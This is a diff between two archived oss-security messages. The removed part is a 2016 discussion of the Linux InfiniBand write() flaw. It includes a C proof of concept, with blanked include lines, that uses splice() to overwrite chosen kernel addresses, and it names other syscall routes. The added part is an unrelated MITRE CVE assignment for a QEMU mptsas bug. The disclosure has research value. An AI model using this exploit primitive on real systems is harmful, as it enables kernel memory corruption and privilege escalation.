@@ -1,144 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/09/13
-Message-ID: <20160509193955.GA3317@pc.thejh.net>
-Date: Mon, 9 May 2016 21:39:55 +0200
-From: Jann Horn <jann@...jh.net>
-To: Yann Droneaud <ydroneaud@...eya.com>
-Cc: Jason Gunthorpe <jgunthorpe@...idianresearch.com>, Doug Ledford <dledford@...hat.com>, linux-rdma@...r.kernel.org, oss-security@...ts.openwall.com
-Subject: Re: CVE Request: Linux: IB/security: Restrict use of the write() interface'
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/16/11
+Message-Id: <20160916172601.892E23AE010@smtpvbsrv1.mitre.org>
+Date: Fri, 16 Sep 2016 13:26:01 -0400 (EDT)
+From: cve-assign@...re.org
+To: ppandit@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, liqiang6-s@....cn
+Subject: Re: CVE request Qemu: scsi: mptsas: OOB access when freeing MPTSASRequest object
 Content-Type: text/plain; charset=utf-8
 
-On Mon, May 09, 2016 at 09:10:41PM +0200, Yann Droneaud wrote:
-> [Cc: oss-security@...ts.openwall.com]
-> 
-> Hi,
-> 
-> Le lundi 09 mai 2016 à 20:02 +0200, Jann Horn a écrit :
-> > On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
-> > > Le samedi 07 mai 2016 à 06:22 +0200, Salvatore Bonaccorso a écrit :
-> > > > 
-> > > >  
-> > > > Jann Horn reported an issue in the infiniband stack. It has been
-> > > > fixed in v4.6-rc6 with commit
-> > > > e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
-> > > > 
-> > > > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3
-> > > > 
-> > > > > 
-> > > > > 
-> > > > > IB/security: Restrict use of the write() interface
-> > > > > The drivers/infiniband stack uses write() as a replacement for
-> > > > > bi-directional ioctl().  This is not safe. There are ways to
-> > > > > trigger write calls that result in the return structure that
-> > > > > is normally written to user space being shunted off to user
-> > > > > specified kernel memory instead.
-> > > > > 
-> > > That's an interesting issue.
-> > > 
-> > > I thought access_ok() done as part of copy_to_user() would protect
-> > > from such unwelcomed behavior. But it's not if the kernel invoke
-> > > write() handler outside of a user process.
-> > > 
-> > > Anyway, as I don't see yet how to reproduce the issue, is there a
-> > > PoC available, I would be interested by a mean to trigger such
-> > > write().
-> 
-> > Here is my writeup of the issue that I made quite a while ago - the
-> > timeline is missing some of the more recent stuff, but meh.
-> > 
-> > ======================================================
-> > 
-> > 
-> > Here is a PoC that can be used to clobber data at arbitrary
-> > writable kernel addresses if the rdma_ucm module is loaded (without
-> > actually needing Infiniband hardware to be present):
-> > 
-> > =====
-> > #define _GNU_SOURCE
-> > #include 
-> > #include 
-> > #include 
-> > #include 
-> > #include 
-> > #include 
-> > 
-> > #include 
-> > #include 
-> > #include 
-> > #include 
-> > #include 
-> > 
-> > #define RDMA_PS_TCP 0x0106
-> > 
-> > // This method forces the kernel to write arbitrary data to the
-> > // target fd under set_fs(KERNEL_DS), bypassing address limit
-> > // checks in anything that extracts pointers from written data.
-> > int write_without_addr_limit(int fd, char *buf, size_t len) {
-> >   int pipefds[2];
-> >   if (pipe(pipefds))
-> >     return -1;
-> >   ssize_t len_ = write(pipefds[1], buf, len);
-> >   if (len == -1)
-> >     return -1;
-> >   int res = splice(pipefds[0], NULL, fd, NULL, len_, 0);
-> >   int errno_ = errno;
-> >   close(pipefds[0]);
-> >   close(pipefds[1]);
-> >   errno = errno_;
-> >   return res;
-> > }
-> > 
-> > int clobber_kaddr(unsigned long kaddr) {
-> >   // open infiniband fd
-> >   int fd = open("/dev/infiniband/rdma_cm", O_RDWR);
-> >   if (fd == -1)
-> >     err(1, "unable to open /dev/infiniband/rdma_cm - maybe the RDMA kernel module isn't loaded?");
-> > 
-> >   // craft malicious write buffer
-> >   // structure:
-> >   //   struct rdma_ucm_cmd_hdr hdr
-> >   //   struct rdma_ucm_create_id cmd
-> >   char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_ucm_create_id)];
-> >   struct rdma_ucm_cmd_hdr *hdr = (void*)buf;
-> >   struct rdma_ucm_create_id *cmd = (void*)(buf + sizeof(struct rdma_ucm_cmd_hdr));
-> >   hdr->cmd = RDMA_USER_CM_CMD_CREATE_ID;
-> >   hdr->in = 0;
-> >   hdr->out = sizeof(struct rdma_ucm_create_id_resp);
-> >   cmd->ps = RDMA_PS_TCP;
-> >   cmd->response = kaddr;
-> > 
-> >   int res = write_without_addr_limit(fd, buf, sizeof(buf));
-> >   int errno_ = errno;
-> >   close(fd);
-> >   errno = errno_;
-> >   return res;
-> > }
-> > 
-> > int main(int argc, char **argv) {
-> >   if (argc != 2)
-> >     errx(1, "want one argument (kernel address to clobber)");
-> >   char *endp;
-> >   unsigned long kaddr = strtoul(argv[1], &endp, 0);
-> >   if (kaddr == ULONG_MAX || *endp || endp == argv[1])
-> >     errx(1, "bad input number");
-> > 
-> >   int r = clobber_kaddr(kaddr);
-> >   if (r >= 0) {
-> >     printf("that probably worked? clobber_kaddr(0x%lx)=%d\n", kaddr, r);
-> >     return 0;
-> >   } else {
-> >     printf("failed: %m\n");
-> >     return 1;
-> >   }
-> > }
-> 
-> 
-> Is this only achievable through splice() ?
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-sendfile() and the new copy_file_range() syscall (in kernel >=4.5) would
-probably both work, too - they all use the splice mechanism internally.
+> Quick emulator(Qemu) built with the LSI SAS1068 Host Bus emulation support, is
+> vulnerable to an invalid memory access issue. It could occur while processing
+> scsi io requests in mptsas_process_scsi_io_request.
+> 
+> A privileged user inside guest could use this flaw to crash the Qemu process
+> instance on the host resulting in DoS.
+> 
+> https://lists.gnu.org/archive/html/qemu-devel/2016-09/msg03604.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=1376776
+> http://git.qemu.org/?p=qemu.git;a=commit;h=670e56d3ed2918b3861d9216f2c0540d9e9ae0d5
 
-ecryptfs also calls the VFS methods of the lower filesystem under KERNEL_DS
-iirc, it might also be possible to attack infiniband that way.
+>> scsi: mptsas: use g_new0 to allocate MPTSASRequest object
+>> 
+>> When processing IO request in mptsas, it uses g_new to allocate
+>> a 'req' object. If an error occurs before 'req->sreq' is
+>> allocated, It could lead to an OOB write in mptsas_free_request
+>> function. Use g_new0 to avoid it.
 
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+Use CVE-2016-7423.
+
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCAAGBQJX3CoQAAoJEHb/MwWLVhi2jDcP+wbIpI1ey0NwiBCdBhQhtIcM
+OinhQ7vBTP7wqOZqMEnJoWRdK3A56/JxfXs5chnHEUxiiC5sy59sMoDa/wJ9M2yL
+WDCzYZLVpTevTW/fbeMnXel3Xc5IFB80yaAuDqXP48f3s1H6bo2ai0giyWdcbdXY
+UebsZpm9MHxeqN6DYEGnsYe8audTizfe9swwLeWSUXyttzFLGOrL3pJQE6WBORbu
+cbpazz4ylYJcDyY+Th3CNZpFAZGqIcw++DMZKZG00nlgXJ4gWn9raLmfWYVKRumd
+JHczsDj36PqKC5kXsrwyd62YV7TCZFzDHGEQN3ZeGIhIbLaKhc9OSif48V3Xu5pH
+4SzvmEFiSiRCD5HGgikkzyt+lbNy7rbvry8NWYek/pgeXIYkYdywgKB54fs0jNjv
+wVf82M/8QDqFmegkRiEIyF8WsTe6WpwBgRQm7PdNJlyR54gH38/uTCefhPZj9elT
+RdgGkqtinff92C12s+A8nH4GIe8uQnGUt2cv39m02htT5NaSZBTAXPQuoVUJTIjM
++xsymnuJSSMzyy351XG+8T+Cc2er7G+dYdf2aZUMItFlPSaK3Ewp5rFkgAYNClJz
+D6MWKJeXonSrx4j/+z5tTHma64FEgNfKSupEaf5en0od7lR7zB215xFbv6g6P/3d
+8arhpqQkwLxtRAm2n/Ad
+=7sOJ
+-----END PGP SIGNATURE-----
